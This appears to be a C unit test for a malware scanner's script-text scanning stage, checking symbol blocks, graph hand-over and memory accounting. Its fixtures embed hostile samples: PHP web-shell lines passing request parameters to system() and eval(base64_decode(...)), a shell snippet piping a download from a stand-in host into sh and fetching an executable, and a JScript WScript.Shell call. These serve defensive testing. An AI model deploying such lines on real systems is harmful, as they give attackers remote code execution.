/*
 * text_scan_hold - the ONE scan of a script's text (scanners/objctx_textscan.c), driven on a scanner from kof_scan_new with an object the parser identified.
 *
 *   NAMES    the symbol block oc_syms_build makes for a script from the scan's names is the block kof_script_syms makes from a scan of its own, byte for byte, for every
 *            language the route reads, and it is built once: a second ask reads the names kept;
 *   TAKE     the graph comes back for the buffer it was made for, once; another pointer, length or language is refused and the held scan stays; the graph is the graph of a scan made
 *            for the diagnose stage alone;
 *   CONSTS   the constants stage is handed a collector from the same scan when the level asked for them at the start (deep) and from a scan of its own when it did not, and
 *            what is collected is what a scan with the callbacks collects;
 *   LEDGER   what is held is charged to the scanner and every way out gives it back: the take, the drop, a replacing scan;
 *   OTHER    an object that is not a script the route reads gets the block the one builder gives (an ELF's, here: none) and no scan is held.
 *
 * usage: text_scan_hold [database dir]
 */

#include "hostile_engine.h"

#include "../../libkofeng/scanners/scan.h"
#include "../../libkofeng/scanners/scan_state.h"
#include "../../libkofeng/scanners/scan_int.h"
#include "../../libkofeng/scanners/objctx_int.h"
#include "../../libkofeng/analyzers/parsers/scripts/script_parse.h"
#include "../../libkofeng/analyzers/parsers/scripts/script_sym.h"
#include "../../libkofeng/analyzers/parsers/scripts/script_route.h"
#include <phenotype/diag_scan.h>
#include <textual/textual.h>

static kof_engine *eng;
static const char *dbdir = "build/release/databases";

static const struct { const char *name; const char *text; } T[] = {
	{ "php", "<?php $a = 'sys' . 'tem'; $a($_GET['c']); eval(base64_decode($_POST['x'])); ?>" },
	{ "sh", "#!/bin/sh\nx=cur; $x\"l\" http://h/p | sh\nwget -O /var/x/a http://h/a\nchmod +x /var/x/a\n" },
	{ "js", "var s = new ActiveXObject('WScript.Shell'); s.Run(c); eval(x);\n" },
};

static uint64_t graph_hash(const struct kgenome_diag_scan *s)
{
	uint64_t h = 14695981039346656037ull;
	uint32_t i, n = kgenome_diag_scan_count(s), j;

	for (i = 0; i < n; i++) {
		const struct kgenome_diag_hit *t = kgenome_diag_scan_at(s, i);
		uint64_t w[4] = { t->at, t->cap, t->n_in, t->flags };

		for (j = 0; j < 4; j++)
			h = (h ^ w[j]) * 1099511628211ull;
		for (j = 0; j < t->n_in && j < 4u; j++)
			h = (h ^ ((uint64_t)t->in[j].from << 16 | (uint64_t)t->in[j].role << 8 | t->in[j].how)) * 1099511628211ull;
	}
	return h ^ n;
}

int main(int argc, char **argv)
{
	size_t i;

	if (argc > 1)
		dbdir = argv[1];
	eng = keng_open(dbdir);
	if (!eng) {
		printf("text_scan_hold: no database at %s - nothing tested\n", dbdir);
		return 0;
	}
	for (i = 0; i < sizeof T / sizeof T[0]; i++) {
		struct kof_scanner *sc = kof_scan_new(eng);
		kof_buf buf = kof_buf_make(T[i].text, strlen(T[i].text));
		struct kof_script_info info;
		struct kof_script_found keep;
		struct kof_obj_ctx ctx;
		uint8_t own[8192], *blk;
		uint32_t passes = 0, n_own, n_blk, lang;
		uint64_t r0;
		struct kgenome_diag_scan *g, *ref, *held;

		CK(sc != NULL, "%s: a scanner", T[i].name);
		if (!sc)
			continue;
		memset(&ctx, 0, sizeof ctx);
		CK(kof_script_sniff_keep(buf, &keep) != 0, "%s: sniffed as a script", T[i].name);
		CK(kof_script_parse_keep(buf, &info, &ctx, &keep) != 0, "%s: parsed", T[i].name);
		kof_mod_attach(&ctx, sc);
		kof_match_begin(&sc->match.m, buf);
		lang = kof_script_textual_lang(ctx.subtype);
		CK(lang != 0, "%s: a language the route reads", T[i].name);
		r0 = sc->ledger.resident;
		sc->obj.text.deep = 1;

		/* NAMES */
		n_own = kof_script_syms(buf, &info, own, sizeof own);
		n_blk = oc_syms_build(sc, &ctx, NULL, &passes);
		blk = sc->syms.buf;
		CK(n_blk == n_own && blk && memcmp(blk, own, n_own) == 0, "%s: the block from the shared scan is the block from a scan of its own (%u / %u bytes)", T[i].name, n_blk, n_own);
		CK(passes == 1u, "%s: built in one pass (%u)", T[i].name, passes);
		CK(sc->obj.text.deep == 1u, "%s: the object's level survives the scan being made", T[i].name);
		CK(sc->obj.text.s != NULL && sc->ledger.resident > r0, "%s: the scan is held and charged", T[i].name);
		held = sc->obj.text.s;
		n_blk = oc_syms_build(sc, &ctx, NULL, &passes);
		CK(n_blk == n_own && memcmp(sc->syms.buf, own, n_own) == 0, "%s: a second ask gives the block again from the names kept", T[i].name);
		CK(sc->obj.text.s == held && sc->obj.text.made == 1u, "%s: and does not scan again (%u scans made)", T[i].name, sc->obj.text.made);
		/* the scan is bounded by what the scanner has left: with room for next to nothing it says so */
		kof_scan_text_drop(sc);
		sc->ledger.resident_max = sc->ledger.resident + 64u;
		(void)oc_syms_build(sc, &ctx, NULL, &passes);
		CK(sc->obj.text.s && kgenome_diag_scan_status(sc->obj.text.s) != KGENOME_OK, "%s: a scan with no room says so (status %d)", T[i].name, sc->obj.text.s ? (int)kgenome_diag_scan_status(sc->obj.text.s) : -1);
		kof_scan_text_drop(sc);
		sc->ledger.resident_max = 256u << 20;
		(void)oc_syms_build(sc, &ctx, NULL, &passes);
		CK(sc->obj.text.s && kgenome_diag_scan_status(sc->obj.text.s) == KGENOME_OK, "%s: and with room it does not", T[i].name);
		/* a scan that is held is charged, and the drop gives it all back and the object's level stays until the object ends */
		kof_scan_text_drop(sc);
		CK(sc->ledger.resident == r0 && sc->obj.text.s == NULL, "%s: the drop of a held scan gives its charge back", T[i].name);
		sc->obj.text.deep = 1;
		(void)oc_syms_build(sc, &ctx, NULL, &passes);

		/* TAKE */
		CK(oc_text_take(sc, lang, kof_buf_make(buf.p + 1, buf.n)) == NULL, "%s: another pointer", T[i].name);
		CK(oc_text_take(sc, lang, kof_buf_make(buf.p, buf.n - 1u)) == NULL, "%s: another length", T[i].name);
		CK(oc_text_take(sc, lang + 1u, buf) == NULL, "%s: another language", T[i].name);
		g = oc_text_take(sc, lang, buf);
		CK(g != NULL, "%s: the graph is taken", T[i].name);
		CK(sc->ledger.resident == r0, "%s: and its charge given back (%llu, was %llu)", T[i].name, (unsigned long long)sc->ledger.resident, (unsigned long long)r0);
		CK(oc_text_take(sc, lang, buf) == NULL, "%s: once", T[i].name);
		{
			struct kgenome_diag_text_req rq = { .base = buf.p, .size = buf.n, .lang = lang };

			ref = kgenome_diag_scan_text(&rq);
		}
		CK(g && ref && graph_hash(g) == graph_hash(ref), "%s: the graph is the graph of a scan made for it alone", T[i].name);
		kgenome_diag_scan_free(g);
		kgenome_diag_scan_free(ref);

		/* CONSTS: the level was not asked at the start, so the collector comes from a scan of its own, which also holds the graph */
		{
			uint8_t m0 = sc->obj.text.made;
			struct oc_consts *c1 = oc_text_consts(sc, lang, buf), *c2;
			struct kgenome_diag_scan *s1 = sc->obj.text.s;

			CK(sc->obj.text.made == m0 + 1u, "%s: no collector in the scan held, so one scan more", T[i].name);
			CK(c1 != NULL, "%s: a collector when none was asked for", T[i].name);
			c2 = oc_text_consts(sc, lang, buf);
			CK(c2 == c1 && sc->obj.text.s == s1 && sc->obj.text.made == m0 + 1u, "%s: asked again, the same collector from the same scan (%u scans made in all)", T[i].name, sc->obj.text.made);
			CK(sc->obj.text.deep == 1u, "%s: the level survives a replacing scan", T[i].name);
		}
		{
			/* OWNERSHIP: the graph oc_text_take hands over is the taker's - the engine's diagnose stage keeps it in sc->obj.diag.graph and frees it with kof_scan_diag_drop; this test is the
			 * taker here, and it was the one that never freed it (the leak unit-asan reported: scan_new in diag_scan.c, three objects, one per language). */
			struct kgenome_diag_scan *taken = oc_text_take(sc, lang, buf);

			CK(taken != NULL, "%s: and that scan holds a graph too", T[i].name);
			CK(oc_text_take(sc, lang, buf) == NULL, "%s: and it is handed over once", T[i].name);
			kgenome_diag_scan_free(taken);
		}
		kof_scan_text_drop(sc);
		CK(sc->ledger.resident == r0, "%s: the drop gives everything back", T[i].name);
		kof_scan_free(sc);
	}
	/* G16: the product is keyed by (buffer, length, language), and the caller may refill ONE buffer for the next object (a host that scans a stream of files into the same
	 * array): the object's reset is what makes that safe - sx_obj_begin drops the held scan - so the second object's block is its own and not the first's. */
	{
		struct kof_scanner *sc = kof_scan_new(eng);
		char txt[64] = "<?php system($_GET[0]); ?>";
		static const char B[] = "<?php eval($_POST[0]);  ?>";
		kof_buf pb = kof_buf_make(txt, strlen(txt));
		struct kof_script_info info;
		struct kof_script_found keep;
		struct kof_obj_ctx ctx;
		uint8_t own[8192];
		uint32_t passes = 0, n_own, n_blk;
		int round;

		CK(sc != NULL && strlen(B) == strlen(txt), "G16: a scanner, and two texts of one length");
		for (round = 0; round < 2 && sc; round++) {
			if (round) {
				memcpy(txt, B, sizeof B);                  /* the same array, the same length, the same language: other bytes */
				sx_obj_begin(sc);
			}
			memset(&ctx, 0, sizeof ctx);
			CK(kof_script_sniff_keep(pb, &keep) != 0 && kof_script_parse_keep(pb, &info, &ctx, &keep) != 0, "G16: round %d: a script", round);
			kof_mod_attach(&ctx, sc);
			kof_match_begin(&sc->match.m, pb);
			n_own = kof_script_syms(pb, &info, own, sizeof own);
			n_blk = oc_syms_build(sc, &ctx, NULL, &passes);
			CK(n_own > 0u && n_blk == n_own && memcmp(sc->syms.buf, own, n_own) == 0, "G16: round %d: the block is the one of this text (%u / %u bytes)", round, n_blk, n_own);
			CK(sc->obj.text.made == 1u, "G16: round %d: the scan was made for this object (%u scans)", round, sc->obj.text.made);
		}
		kof_scan_free(sc);
	}
	/* the evaluator's nesting bound is remembered for the stage that reads the constants: 300 brackets deep is past it, a plain assignment is not */
	{
		static char deepphp[1024];
		struct kof_scanner *sc = kof_scan_new(eng);
		uint32_t k, w = 0;
		kof_buf pb;

		w += (uint32_t)snprintf(deepphp + w, sizeof deepphp - w, "<?php $a = ");
		for (k = 0; k < 300u; k++)
			deepphp[w++] = '(';
		w += (uint32_t)snprintf(deepphp + w, sizeof deepphp - w, "'x'");
		for (k = 0; k < 300u; k++)
			deepphp[w++] = ')';
		w += (uint32_t)snprintf(deepphp + w, sizeof deepphp - w, "; system($a); ?>");
		pb = kof_buf_make(deepphp, w);
		CK(oc_text_consts(sc, KGENOME_TEXTUAL_LANG_PHP, pb) != NULL && oc_text_eval_cut(sc) == 1, "the bound that fired is remembered");
		/* the length is the literal's own: it was written as 38 and the literal is 37 bytes, so the scan read one byte past it (a global-buffer-overflow under unit-asan, which hid the leak below) */
		pb = kof_buf_make("<?php $a = 'x' . 'y'; system($a); ?>", strlen("<?php $a = 'x' . 'y'; system($a); ?>"));
		CK(oc_text_consts(sc, KGENOME_TEXTUAL_LANG_PHP, pb) != NULL && oc_text_eval_cut(sc) == 0, "and not remembered for the next text");
		kof_scan_free(sc);
	}
	/* a script of a kind the route does not read (no language: an interpreter with no row) gets the block the one builder gives, and no scan is held */
	{
		struct kof_scanner *sc = kof_scan_new(eng);
		const char *awk = "#!/usr/bin/awk -f\nBEGIN { print 1 }\n";
		kof_buf ab = kof_buf_make(awk, strlen(awk));
		struct kof_script_info info;
		struct kof_script_found keep;
		struct kof_obj_ctx ctx;
		uint8_t own[256];
		uint32_t passes = 0, n_own, n_blk;

		memset(&ctx, 0, sizeof ctx);
		CK(kof_script_sniff_keep(ab, &keep) && kof_script_parse_keep(ab, &info, &ctx, &keep), "an awk script is a script");
		kof_mod_attach(&ctx, sc);
		kof_match_begin(&sc->match.m, ab);
		CK(kof_script_textual_lang(ctx.subtype) == 0u, "of no language the route reads");
		n_own = kof_script_syms(ab, &info, own, sizeof own);
		n_blk = oc_syms_build(sc, &ctx, NULL, &passes);
		CK(n_own > 0u && n_blk == n_own && memcmp(sc->syms.buf, own, n_own) == 0 && sc->obj.text.s == NULL, "its block is the one builder's, and no scan is held");
		kof_scan_free(sc);
	}
	/* an ELF's block is the one builder's: no scan is made for it */
	{
		struct kof_scanner *sc = kof_scan_new(eng);
		uint8_t elf[64] = { 0x7f, 'E', 'L', 'F' };
		struct kof_obj_ctx ctx;
		uint32_t passes = 0;

		memset(&ctx, 0, sizeof ctx);
		ctx.format = KOF_FMT_UNKNOWN;
		kof_mod_attach(&ctx, sc);
		kof_match_begin(&sc->match.m, kof_buf_make(elf, sizeof elf));
		(void)oc_syms_build(sc, &ctx, NULL, &passes);
		CK(sc->obj.text.s == NULL, "no scan is held for an object that is not a script");
		kof_scan_free(sc);
	}
	keng_close(eng);
	printf("text_scan_hold: %u checks, %u failed\n", he_checks, he_fails);
	return he_fails != 0;
}
